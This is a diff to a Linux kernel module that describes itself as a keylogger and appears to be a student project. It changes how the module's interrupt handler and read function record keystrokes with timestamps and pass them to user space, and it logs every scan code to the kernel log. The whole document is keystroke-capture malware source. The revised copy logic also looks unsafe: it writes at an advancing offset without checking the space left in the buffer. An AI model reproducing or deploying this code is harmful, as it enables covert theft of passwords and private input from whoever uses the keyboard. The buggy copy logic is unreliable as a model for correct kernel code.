@@ -7,6 +7,7 @@ MODULE_AUTHOR("stmartin");
 MODULE_DESCRIPTION("Module keylog");
 
 t_keylst	*k_lst = NULL;
+int		read_done = 0;
 
 void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t len)
 {
@@ -17,12 +18,12 @@ void		display_list_element(t_keylst *node, char *buffer, loff_t **offset, size_t
 			(node->time.tv_sec / 60) % 60, node->time.tv_sec % 60, \
 		       	node->name, node->key, node->state ? "Released" : "Pressed");
 	msg_len = strlen(message);
-	if (**offset == 0 && len > msg_len)
+	if (len > msg_len)
 	{
-		if (!copy_to_user(buffer, message, msg_len))
+		if (!copy_to_user(buffer + **offset, message, msg_len))
 		{
 			**offset += msg_len;
-			printk(KERN_INFO "in copy_to_user\n");
+			printk(KERN_INFO "keylogger: in copy_to_user len [%ld] et msg_len [%d]\n", len, msg_len);
 		}
 		else
 		{
@@ -44,16 +45,16 @@ int		browse_linked_list(t_keylst *lst, char *buffer, loff_t **offset, size_t len
 		display_list_element(tmp, buffer, offset, len);
 		tmp = tmp->next;
 	}
-	return 0;
+	return 2;
 }
 
 static ssize_t	key_read(struct file *filep, char *buffer, size_t len, loff_t *offset)
 {
 	printk(KERN_INFO "keylogger: in read\n");
-	if (!browse_linked_list(k_lst, buffer, &offset, len))
+	if (read_done == 0 && browse_linked_list(k_lst, buffer, &offset, len) == 2)
 	{
-		*offset = 0;
-		return strlen(buffer);
+		read_done = 1;
+		return (*offset);
 	}
 	printk(KERN_INFO "keylogger: offset [%lld]\n", *offset);
 	return 0;
@@ -88,7 +89,6 @@ t_keylst		*init_node(t_keylst *node, unsigned char scancode)
 	strcpy(node->name, keyboard_name[scancode & KBD_SCANCODE_MASK]);
 	getnstimeofday(&(node->time));
 	node->next = NULL;
-//	printk(KERN_INFO "key [%d] state [%d] name [%s] time [%ld]\n", node->key, node->state, node->name, node->time.tv_sec);
 	return node;
 }
 
@@ -115,6 +115,7 @@ static irqreturn_t 	kbd_irq_handler(int irq, void* dev_id)
 {
 	unsigned char /*status, */scancode;
 
+	read_done = 0;
 	scancode = inb(KEYBOARD_DATA);
 	printk(KERN_INFO "Scan Code %d %s\n",
             keyboard_map[scancode & KBD_SCANCODE_MASK],
